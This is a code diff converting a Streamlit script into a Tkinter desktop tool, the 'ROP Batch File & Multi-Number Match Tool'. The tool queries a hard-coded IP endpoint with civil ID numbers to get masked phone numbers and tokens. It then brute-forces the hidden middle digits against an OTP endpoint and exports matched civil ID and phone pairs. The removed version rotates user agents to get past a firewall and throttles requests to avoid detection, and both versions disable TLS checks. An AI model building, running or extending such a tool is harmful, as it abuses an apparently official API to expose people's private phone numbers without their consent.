@@ -1,266 +1,521 @@
 import concurrent.futures
+import csv
 import json
-import random
+import re
+import threading
 import time
-import pandas as pd
+import tkinter as tk
+from tkinter import filedialog, messagebox, scrolledtext, ttk
 import requests
-import streamlit as st
 import urllib3
 
+# Disable insecure HTTPS warnings for IP-based endpoints
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-st.set_page_config(
-    page_title="ROP Batch & Multi-Number Match Tool", page_icon="📱", layout="wide"
-)
 
-# Initialize session state
-if "otp_results" not in st.session_state:
-  st.session_state.otp_results = []
-if "unmatched_results" not in st.session_state:
-  st.session_state.unmatched_results = []
-if "logs" not in st.session_state:
-  st.session_state.logs = []
+class ROPFullTool:
 
+    def __init__(self, root):
+        self.root = root
+        self.root.title("📱 ROP Batch File & Multi-Number Match Tool")
+        self.root.geometry("1100x980")
+        self.root.configure(bg="#1e1e1e")
+        self.session = requests.Session()
+        self.session.verify = False
 
-def log_message(msg):
-  st.session_state.logs.append(msg)
+        self.token_lock = threading.Lock()
+        self.host = "5.37.58.147"
 
+        self.otp_results = []
+        self.unmatched_results = []
+        self.is_running = False
+        self.stop_requested = False
 
-# Realistic Browser User-Agents (Firewall Bypass karne ke liye)
-USER_AGENTS = [
-    (
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)"
-        " AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148"
-        " Safari/604.1"
-    ),
-    (
-        "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML,"
-        " like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
-    ),
-]
+        self.setup_ui()
+        self.load_default_cookies_and_headers()
 
-
-def get_headers(host):
-  return {
-      "host": host,
-      "content-type": "application/json",
-      "accept": "application/json, text/plain, */*",
-      "accept-encoding": "gzip, deflate",
-      "user-agent": random.choice(USER_AGENTS),  # Dynamic User-Agent
-      "connection": "keep-alive",
-  }
-
-
-def fetch_fresh_token_for_civil_id(host, civil_id, session):
-  try:
-    url = f"https://{host}/nrsPhone"
-    payload = {"civilId": civil_id}
-    headers = get_headers(host)
-
-    # Timeout barha kar 15 sec kiya gaya hai
-    resp = session.post(url, json=payload, headers=headers, timeout=15)
-    data = json.loads(resp.text.strip())
-    if "mobile" in data and data["mobile"]:
-      return True, data
-    return False, data
-  except Exception as e:
-    log_message(f"⚠️ NRS Token Error ({civil_id}): {str(e)}")
-    return False, {}
-
-
-def test_single_phone_fast(
-    host, civil_id, phone, token_val, civil_id_token, session
-):
-  try:
-    url = f"https://{host}/otp"
-    payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
-    headers = get_headers(host)
-
-    resp = session.post(url, json=payload, headers=headers, timeout=15)
-    resp_text = resp.text.strip()
-
-    if resp_text and "token" in resp_text and "id" in resp_text:
-      entry = {"civil_id": civil_id, "phone": phone}
-      if entry not in st.session_state.otp_results:
-        st.session_state.otp_results.append(entry)
-      log_message(f"🎯 MATCH FOUND: Civil ID -> {civil_id} | Phone -> {phone}")
-      return True
-  except Exception as e:
-    # Error detail log karein taake pata chale disconnect kyun hua
-    pass
-  return False
-
-
-st.title("📱 ROP Batch File & Multi-Number Match Tool")
-st.write(
-    "Aik sath multiple IDs aur Last 4 digits enter karein, live match dekhein"
-    " aur CSV download karein."
-)
-
-host = "5.37.58.147"
-
-batch_text = st.text_area(
-    "Enter CivilID, Last4Digits (Aik line mein ek, misal ke tor par: 5701982,"
-    " 1944)",
-    value="5701982, 1944",
-    height=150,
-)
-
-col1, col2, col3 = st.columns(3)
-start_search = col1.button("🚀 Start Batch Search", type="primary")
-clear_btn = col3.button("🧹 Clear All Data")
-
-if clear_btn:
-  st.session_state.otp_results = []
-  st.session_state.unmatched_results = []
-  st.session_state.logs = []
-  st.rerun()
-
-if start_search:
-  if not batch_text.strip():
-    st.error("Pehle batch data enter karein!")
-  else:
-    lines = batch_text.split("\n")
-    tasks_list = []
-    seen_ids = set()
-
-    for line in lines:
-      line = line.strip()
-      if not line or line.startswith("#"):
-        continue
-      parts = [p.strip() for p in line.replace(";", ",").split(",")]
-      if len(parts) >= 2:
-        cid = parts[0]
-        last4 = parts[1]
-        if (
-            cid.isdigit()
-            and last4.isdigit()
-            and len(last4) == 4
-            and cid not in seen_ids
-        ):
-          seen_ids.add(cid)
-          tasks_list.append((cid, last4))
-
-    if not tasks_list:
-      st.error("Sahi format enter karein: CivilID, Last4Digits")
-    else:
-      st.success(
-          f"Starting search for {len(tasks_list)} Unique Civil ID(s)..."
-      )
-      progress_bar = st.progress(0)
-      total_tasks = len(tasks_list)
-
-      session = requests.Session()
-      session.verify = False
-
-      for idx, (civil_id, suffix) in enumerate(tasks_list):
-        success, data = fetch_fresh_token_for_civil_id(
-            host, civil_id, session
+    def load_default_cookies_and_headers(self):
+        sample_header = (
+            f"POST /nrsPhone HTTP/1.1\nHost: {self.host}\nContent-Type:"
+            " application/json"
+        )
+        self.burp_entry.insert(tk.END, sample_header)
+        self.status_label.config(text="✅ READY", fg="#00ff88")
+        self.token_status.config(
+            text="Multi-Number Sequential Checking Enabled!"
         )
 
-        if not success or not data or not data.get("mobile"):
-          st.session_state.unmatched_results.append(
-              {"civil_id": civil_id, "last_four": suffix}
-          )
-          progress_bar.progress((idx + 1) / total_tasks)
-          continue
+    def parse_header(self):
+        burp_text = self.burp_entry.get("1.0", tk.END).strip()
+        if not burp_text:
+            messagebox.showerror("Error", "Pehle Header paste karein!")
+            return
 
-        mobile_dict = data.get("mobile", {})
-        civil_id_token = data.get("civilId", "")
-        matched_in_this_id = False
+        host_match = re.search(r"Host:\s*([^\r\n\s]+)", burp_text, tk.IGNORECASE)
+        if host_match:
+            self.host = host_match.group(1).strip()
+            # Update Host entry field as well
+            self.bearer_entry.delete(0, tk.END)
+            self.bearer_entry.insert(0, self.host)
 
-        for masked_num, token_val in mobile_dict.items():
-          if matched_in_this_id:
-            break
-          clean_digits = "".join(filter(str.isdigit, masked_num))
-          if len(clean_digits) < 2:
-            continue
-          prefix = clean_digits[:2]
+        self.status_label.config(text="✅ READY", fg="#00ff88")
+        self.token_status.config(text="Header Updated Successfully!")
+        self.log(f"✅ Header re-parsed successfully. Host: {self.host}\n")
 
-          phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
+    def fetch_fresh_token_for_civil_id(self, civil_id):
+        # Sync host from entry widget if modified
+        host_val = self.bearer_entry.get().strip()
+        if host_val:
+            self.host = host_val
 
-          # Batch size 5 se kam karke 3 kar di taake SIM firewall catch na kare
-          batch_size = 3
+        with self.token_lock:
+            try:
+                url = f"https://{self.host}/nrsPhone"
+                payload = {"civilId": civil_id}
+                headers = self.get_headers()
 
-          for i in range(0, len(phone_numbers), batch_size):
-            if matched_in_this_id:
-              break
-            batch = phone_numbers[i : i + batch_size]
+                resp = self.session.post(
+                    url, json=payload, headers=headers, timeout=10
+                )
+                resp_text = resp.text.strip()
+                self.root.after(
+                    0, lambda d=resp_text: self.log(f"📥 Civil ID Response: {d}\n")
+                )
 
-            with concurrent.futures.ThreadPoolExecutor(
-                max_workers=batch_size
-            ) as executor:
-              futures = {
-                  executor.submit(
-                      test_single_phone_fast,
-                      host,
-                      civil_id,
-                      phone,
-                      token_val,
-                      civil_id_token,
-                      session,
-                  ): phone
-                  for phone in batch
-              }
-              for future in concurrent.futures.as_completed(futures):
-                try:
-                  if future.result():
-                    matched_in_this_id = True
-                    break
-                except Exception:
-                  pass
+                data = json.loads(resp_text)
+                if "mobile" in data and data["mobile"]:
+                    return True, data
+                return False, data
+            except Exception as e:
+                self.root.after(
+                    0,
+                    lambda err=str(e): self.log(
+                        f"❌ Error fetching mobile data: {err}\n"
+                    ),
+                )
+                return False, {}
 
-            # Chota sa delay taake SIM data block na kare
-            time.sleep(0.1)
+    def load_batch_file(self):
+        file_path = filedialog.askopenfilename(
+            title="Select Batch File",
+            filetypes=[("Text / CSV Files", "*.txt *.csv"), ("All Files", "*.*")],
+        )
+        if file_path:
+            try:
+                with open(file_path, "r", encoding="utf-8") as f:
+                    content = f.read()
+                    self.batch_entry.delete("1.0", tk.END)
+                    self.batch_entry.insert(tk.END, content)
+                    self.log(f"📁 Batch file loaded successfully: {file_path}\n")
+            except Exception as e:
+                messagebox.showerror(
+                    "Error", f"File load karne mein masla aaya: {str(e)}"
+                )
 
-        if not matched_in_this_id:
-          st.session_state.unmatched_results.append(
-              {"civil_id": civil_id, "last_four": suffix}
-          )
+    def run_batch_search(self):
+        if self.is_running:
+            messagebox.showwarning("Busy", "Process already running!")
+            return
 
-        progress_bar.progress((idx + 1) / total_tasks)
+        batch_text = self.batch_entry.get("1.0", tk.END).strip()
+        if not batch_text:
+            messagebox.showerror(
+                "Error", "Pehle batch data enter karein ya file load karein!"
+            )
+            return
 
-      st.success("Batch Search Complete!")
-      st.rerun()
+        lines = batch_text.split("\n")
+        tasks_list = []
+        seen_ids = set()
 
-# Results Display Section
-st.markdown("---")
-res_col1, res_col2 = st.columns(2)
+        for line in lines:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            parts = re.split(r"[,;\s]+", line)
+            if len(parts) >= 2:
+                cid = parts[0].strip()
+                last4 = parts[1].strip()
+                if (
+                    cid.isdigit()
+                    and last4.isdigit()
+                    and len(last4) == 4
+                    and cid not in seen_ids
+                ):
+                    seen_ids.add(cid)
+                    tasks_list.append((cid, last4))
 
-with res_col1:
-  st.subheader("🎯 Matched Results")
-  if st.session_state.otp_results:
-    df_matched = pd.DataFrame(st.session_state.otp_results)
-    st.dataframe(df_matched, use_container_width=True)
-    csv_matched_data = df_matched.to_csv(index=False).encode("utf-8")
-    st.download_button(
-        "📥 Download Matched CSV",
-        data=csv_matched_data,
-        file_name="matched_results.csv",
-        mime="text/csv",
-    )
-  else:
-    st.info("No matches yet.")
+        if not tasks_list:
+            messagebox.showerror(
+                "Error", "Koi valid format nahi mila! Sahi format: CivilID, Last4Digits"
+            )
+            return
 
-with res_col2:
-  st.subheader("⚠️ Unmatched Numbers")
-  if st.session_state.unmatched_results:
-    df_unmatched = pd.DataFrame(st.session_state.unmatched_results)
-    st.dataframe(df_unmatched, use_container_width=True)
-    csv_unmatched_data = df_unmatched.to_csv(index=False).encode("utf-8")
-    st.download_button(
-        "📥 Download Unmatched CSV",
-        data=csv_unmatched_data,
-        file_name="unmatched_results.csv",
-        mime="text/csv",
-    )
-  else:
-    st.info("No unmatched records.")
+        self.is_running = True
+        self.stop_requested = False
+        self.status_label.config(text="🔄 Running Batch Search...", fg="#00ff88")
+        self.log(
+            f"🚀 Starting Batch Search for {len(tasks_list)} Unique Civil ID(s)...\n"
+        )
 
-# Logs
-if st.session_state.logs:
-  st.markdown("---")
-  st.subheader("📋 Logs")
-  st.text_area(
-      "Live Logs", value="\n".join(st.session_state.logs[-50:]), height=150
-  )
+        threading.Thread(
+            target=self._worker_batch_search, args=(tasks_list,), daemon=True
+        ).start()
+
+    def _worker_batch_search(self, tasks_list):
+        try:
+            idx = 0
+            total = len(tasks_list)
+
+            while idx < total and not self.stop_requested:
+                civil_id, suffix = tasks_list[idx]
+
+                self.root.after(
+                    0,
+                    lambda c=civil_id, i=idx + 1, t=total: self.log(
+                        f"\n--- Processing [{i}/{t}] Civil ID: {c} ---\n"
+                    ),
+                )
+
+                success, data = self.fetch_fresh_token_for_civil_id(civil_id)
+                if not success or not data:
+                    self.root.after(
+                        0,
+                        lambda c=civil_id: self.log(
+                            f"❌ Failed to fetch data for {c}, skipping to next...\n"
+                        ),
+                    )
+                    self.unmatched_results.append(
+                        {"civil_id": civil_id, "last_four": suffix}
+                    )
+                    idx += 1
+                    continue
+
+                mobile_dict = data.get("mobile", {})
+                civil_id_token = data.get("civilId", "")
+
+                if not mobile_dict:
+                    self.unmatched_results.append(
+                        {"civil_id": civil_id, "last_four": suffix}
+                    )
+                    idx += 1
+                    continue
+
+                matched_in_this_id = False
+
+                for masked_num, token_val in mobile_dict.items():
+                    if self.stop_requested or matched_in_this_id:
+                        break
+
+                    clean_digits = re.sub(r"\D", "", masked_num)
+                    if len(clean_digits) < 2:
+                        continue
+
+                    prefix = clean_digits[:2]
+                    self.root.after(
+                        0,
+                        lambda p=prefix, m=masked_num, c=civil_id: self.log(
+                            f"⚡ Testing Mask: {m} (Prefix: {p}) for Civil ID: {c}\n"
+                        ),
+                    )
+
+                    phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
+                    batch_size = 5
+
+                    for i in range(0, len(phone_numbers), batch_size):
+                        if self.stop_requested or matched_in_this_id:
+                            break
+                        batch = phone_numbers[i : i + batch_size]
+
+                        with concurrent.futures.ThreadPoolExecutor(
+                            max_workers=batch_size
+                        ) as executor:
+                            futures = {
+                                executor.submit(
+                                    self._test_single_phone_fast,
+                                    civil_id,
+                                    phone,
+                                    token_val,
+                                    civil_id_token,
+                                ): phone
+                                for phone in batch
+                            }
+
+                            for future in concurrent.futures.as_completed(futures):
+                                if self.stop_requested:
+                                    break
+                                try:
+                                    matched = future.result()
+                                    if matched:
+                                        matched_in_this_id = True
+                                        break
+                                except Exception:
+                                    pass
+                        if matched_in_this_id or self.stop_requested:
+                            break
+
+                if not matched_in_this_id and not self.stop_requested:
+                    self.unmatched_results.append(
+                        {"civil_id": civil_id, "last_four": suffix}
+                    )
+                    self.root.after(
+                        0,
+                        lambda c=civil_id: self.log(
+                            f"⚠️ Number not matched for Civil ID: {c}\n"
+                        ),
+                    )
+
+                idx += 1
+
+        except Exception as e:
+            self.root.after(0, lambda: self.log(f"❌ Batch Error: {str(e)}\n"))
+        finally:
+            self.root.after(0, self.done)
+
+    def _test_single_phone_fast(
+        self, civil_id, phone, token_val, civil_id_token
+    ):
+        if self.stop_requested:
+            return False
+
+        try:
+            url = f"https://{self.host}/otp"
+            payload = {"mobile": {phone: token_val}, "civilId": civil_id_token}
+            headers = self.get_headers()
+
+            resp = self.session.post(
+                url, json=payload, headers=headers, timeout=10
+            )
+            resp_text = resp.text.strip()
+
+            if resp_text and "token" in resp_text and "id" in resp_text:
+                self.otp_results.append({"civil_id": civil_id, "phone": phone})
+                self.root.after(0, self.update_table)
+                self.root.after(
+                    0,
+                    lambda p=phone, cid=civil_id: self.log(
+                        f"🎯 MATCH FOUND: Civil ID -> {cid} | Phone -> {p}\n"
+                    ),
+                )
+                return True
+        except Exception:
+            pass
+        return False
+
+    def export_csv(self):
+        if not self.otp_results:
+            messagebox.showwarning("Warning", "Koi data available nahi hai!")
+            return
+
+        file_path = filedialog.asksaveasfilename(
+            defaultextension=".csv",
+            filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")],
+        )
+        if file_path:
+            try:
+                with open(file_path, mode="w", newline="", encoding="utf-8") as f:
+                    writer = csv.writer(f)
+                    writer.writerow(["Civil ID", "Phone Number"])
+                    for r in self.otp_results:
+                        writer.writerow([r["civil_id"], r["phone"]])
+                messagebox.showinfo("Success", "Data CSV mein export ho gaya!")
+            except Exception as e:
+                messagebox.showerror("Error", f"Masla aaya: {str(e)}")
+
+    def export_unmatched_csv(self):
+        if not self.unmatched_results:
+            messagebox.showwarning("Warning", "Koi unmatched data available nahi hai!")
+            return
+
+        file_path = filedialog.asksaveasfilename(
+            defaultextension=".csv",
+            title="Save Not Match Numbers",
+            filetypes=[("CSV Files", "*.csv"), ("All Files", "*.*")],
+        )
+        if file_path:
+            try:
+                with open(file_path, mode="w", newline="", encoding="utf-8") as f:
+                    writer = csv.writer(f)
+                    writer.writerow(["Civil ID", "Last 4 Digits"])
+                    for r in self.unmatched_results:
+                        writer.writerow([r["civil_id"], r["last_four"]])
+                messagebox.showinfo("Success", "Not Match Numbers CSV mein save ho gaye!")
+            except Exception as e:
+                messagebox.showerror("Error", f"Masla aaya: {str(e)}")
+
+    def get_headers(self):
+        return {
+            "host": self.host,
+            "content-type": "application/json",
+            "accept-encoding": "gzip",
+            "user-agent": "Dart/3.9 (dart:io)",
+        }
+
+    def done(self):
+        self.is_running = False
+        self.status_label.config(text="Completed", fg="#00ff88")
+
+    def stop_process(self):
+        self.stop_requested = True
+        self.status_label.config(text="Stopped", fg="#ffaa00")
+
+    def update_table(self):
+        for item in self.tree.get_children():
+            self.tree.delete(item)
+        for r in self.otp_results:
+            self.tree.insert("", "end", values=(r["civil_id"], r["phone"]))
+
+    def log(self, msg):
+        self.console.insert(tk.END, msg)
+        self.console.see(tk.END)
+
+    def clear_all(self):
+        self.otp_results.clear()
+        self.unmatched_results.clear()
+        self.update_table()
+        self.console.delete("1.0", tk.END)
+
+    def setup_ui(self):
+        main_frame = tk.Frame(self.root, bg="#1e1e1e")
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
+
+        hf = tk.LabelFrame(
+            main_frame,
+            text="Request Header / Host",
+            bg="#2d2d2d",
+            fg="white",
+            font=("Arial", 10, "bold"),
+        )
+        hf.pack(fill=tk.X, pady=2)
+        self.burp_entry = scrolledtext.ScrolledText(
+            hf, height=2, bg="#1a1a1a", fg="#00ff41"
+        )
+        self.burp_entry.pack(fill=tk.X, padx=5, pady=2)
+        tk.Button(
+            hf,
+            text="REFRESH/PARSE HEADER",
+            command=self.parse_header,
+            bg="#00ff88",
+            font=("Arial", 9, "bold"),
+        ).pack(pady=2)
+        self.token_status = tk.Label(hf, text="", fg="#ff4444", bg="#2d2d2d")
+        self.token_status.pack()
+
+        baf = tk.LabelFrame(
+            main_frame,
+            text="Batch Search (CivilID, Last4Digits per line)",
+            bg="#2d2d2d",
+            fg="white",
+            font=("Arial", 10, "bold"),
+        )
+        baf.pack(fill=tk.X, pady=3)
+
+        self.batch_entry = scrolledtext.ScrolledText(
+            baf, height=4, bg="#1a1a1a", fg="#00ff88", font=("Consolas", 10)
+        )
+        self.batch_entry.pack(fill=tk.X, padx=5, pady=3)
+        self.batch_entry.insert(tk.END, "5701982, 1944\n")
+
+        br_frame = tk.Frame(baf, bg="#2d2d2d")
+        br_frame.pack(fill=tk.X, pady=3)
+
+        tk.Button(
+            br_frame,
+            text="📁 LOAD BATCH FILE",
+            command=self.load_batch_file,
+            bg="#00aa88",
+            fg="white",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+        tk.Button(
+            br_frame,
+            text="🚀 START BATCH SEARCH",
+            command=self.run_batch_search,
+            bg="#ffaa00",
+            fg="black",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+        tk.Button(
+            br_frame,
+            text="STOP",
+            command=self.stop_process,
+            bg="#ff3333",
+            fg="white",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+
+        self.status_label = tk.Label(
+            br_frame, text="Idle", fg="#00ff88", bg="#2d2d2d", font=("Arial", 9, "bold")
+        )
+        self.status_label.pack(side=tk.LEFT, padx=10)
+
+        r2 = tk.Frame(baf, bg="#2d2d2d")
+        r2.pack(fill=tk.X, pady=2)
+        tk.Label(
+            r2,
+            text="API Target Host:",
+            fg="#00ff88",
+            bg="#2d2d2d",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+        self.bearer_entry = tk.Entry(r2, width=65, bg="#1a1a1a", fg="white")
+        self.bearer_entry.pack(side=tk.LEFT, padx=5)
+        self.bearer_entry.insert(0, "5.37.58.147")
+
+        tf = tk.LabelFrame(
+            main_frame,
+            text="Matched Results Table",
+            bg="#2d2d2d",
+            fg="white",
+            font=("Arial", 10, "bold"),
+        )
+        tf.pack(fill=tk.BOTH, expand=True, pady=3)
+
+        self.tree = ttk.Treeview(
+            tf, columns=("CivilID", "Phone"), show="headings", height=5
+        )
+        self.tree.heading("CivilID", text="Civil ID")
+        self.tree.column("CivilID", width=200, anchor="center")
+        self.tree.heading("Phone", text="Phone Number")
+        self.tree.column("Phone", width=200, anchor="center")
+        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=3)
+
+        bf = tk.Frame(main_frame, bg="#1e1e1e")
+        bf.pack(fill=tk.X, pady=2)
+        tk.Button(
+            bf,
+            text="EXPORT TO CSV",
+            command=self.export_csv,
+            bg="#00aa88",
+            fg="white",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+        
+        # Fixed the NOT MATCH NUMBER button packing issue here
+        tk.Button(
+            bf,
+            text="NOT MATCH NUMBER",
+            command=self.export_unmatched_csv,
+            bg="#aa5500",
+            fg="white",
+            font=("Arial", 9, "bold"),
+        ).pack(side=tk.LEFT, padx=5)
+
+        tk.Button(
+            bf, text="CLEAR", command=self.clear_all, bg="#ff4444", fg="white", font=("Arial", 9, "bold")
+        ).pack(side=tk.LEFT, padx=5)
+
+        self.console = scrolledtext.ScrolledText(
+            main_frame, height=6, bg="#0a0a0a", fg="#00ff41"
+        )
+        self.console.pack(fill=tk.X, pady=3)
+
+
+def main():
+    root = tk.Tk()
+    app = ROPFullTool(root)
+    root.mainloop()
+
+
+if __name__ == "__main__":
+    main()
